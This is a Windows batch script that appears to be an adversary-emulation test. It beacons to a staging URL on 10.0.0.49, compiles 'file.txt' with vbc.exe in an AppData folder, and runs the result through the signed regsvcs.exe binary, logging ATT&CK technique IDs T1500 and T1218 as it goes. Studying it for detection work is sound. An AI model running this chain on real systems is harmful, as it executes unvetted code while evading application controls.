@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
SET recnn=%APPDATA%\9979\b38812c2
SET detcfkn=https://10.0.0.49
SET uouoq=https://10.0.0.49/stage/2/icon.png?9979-10
SET lqyereup=ITZEL-S2BS
SET ufeybybm=10
SET hpnjatpj=exploren.txt
SET njozco=file.txt
SET kkjwr=9979
SET vfkjae=%APPDATA%\!ufeybybm!\macula-simulations.log

echo [!DATE! !TIME!][DEBUG][!lqyereup!][!kkjwr!]: heartbeat_start=>> "!vfkjae!" 2>nul
curl -k -s -o nul "!uouoq!"
echo [!DATE! !TIME!][DEBUG][!lqyereup!][!kkjwr!]: heartbeat_complete=1>> "!vfkjae!" 2>nul

echo [!DATE! !TIME!][DEBUG][!lqyereup!][!kkjwr!]: chdir_start=!recnn!>> "!vfkjae!" 2>nul
cd /d "!recnn!"
SET wmqpoo=%ERRORLEVEL%
echo [!DATE! !TIME!][DEBUG][!lqyereup!][!kkjwr!]: chdir_result=!wmqpoo!>> "!vfkjae!" 2>nul

SET yqgdyu=0
SET tbeuhj=
echo [!DATE! !TIME!][DEBUG][!lqyereup!][!kkjwr!]: compile_start=!njozco!>> "!vfkjae!" 2>nul
"%SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\vbc.exe" /target:library /reference:System.EnterpriseServices.dll "!njozco!" /out:"!hpnjatpj!" >nul 2>&1
IF %ERRORLEVEL% NEQ 0 (
 SET yqgdyu=0
 SET tbeuhj=compile_failed
) ELSE (
 SET yqgdyu=1
 SET tbeuhj=
)
echo [!DATE! !TIME!][TTP][!lqyereup!][!kkjwr!]: T1500|Compile After Delivery=!yqgdyu!|!tbeuhj!>> "!vfkjae!" 2>nul
echo [!DATE! !TIME!][DEBUG][!lqyereup!][!kkjwr!]: compile_result=!yqgdyu!>> "!vfkjae!" 2>nul

SET bkmdja=0
SET uhqomk=
IF !yqgdyu! EQU 1 (
 echo [!DATE! !TIME!][DEBUG][!lqyereup!][!kkjwr!]: execution_start=regsvcs>> "!vfkjae!" 2>nul
 "%SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\regsvcs.exe" "!hpnjatpj!" >nul 2>&1
 IF %ERRORLEVEL% NEQ 0 (
  SET bkmdja=0
  SET uhqomk=assembly_load_failed
 ) ELSE (
  SET bkmdja=1
  SET uhqomk=
 )
) ELSE (
 SET bkmdja=0
 SET uhqomk=skip_due_to_compile_fail
)
echo [!DATE! !TIME!][TTP][!lqyereup!][!kkjwr!]: T1218|Signed Binary Proxy Execution=!bkmdja!|!uhqomk!>> "!vfkjae!" 2>nul
echo [!DATE! !TIME!][DEBUG][!lqyereup!][!kkjwr!]: execution_result=!bkmdja!>> "!vfkjae!" 2>nul
ENDLOCAL